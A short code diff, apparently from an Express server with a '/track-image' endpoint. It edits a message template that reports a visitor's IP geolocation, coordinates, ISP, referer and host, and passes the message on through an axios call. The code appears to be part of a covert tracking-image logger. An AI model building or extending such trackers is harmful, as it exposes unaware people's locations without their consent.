@@ -62,7 +62,7 @@ Country: ${country} (${countryCode})
 Region: ${regionName}
 City: ${city}
 ZIP: ${zip}
-🌐 Location: [Open Map](${locationLink})
+🌐 Location: ${locationLink}
 Lat, Lon: ${lat}, ${lon}
 Timezone: ${timezone}
 ISP: ${isp}
@@ -145,6 +145,7 @@ app.get("/track-image", async (req, res) => {
 🔗 Referer: ${referer}
 🔌 Connection: ${connection}
 🧑‍💻 Host: ${host}
+👉 Location Link: ${locationLink}
     `;
 
     await axios.get(
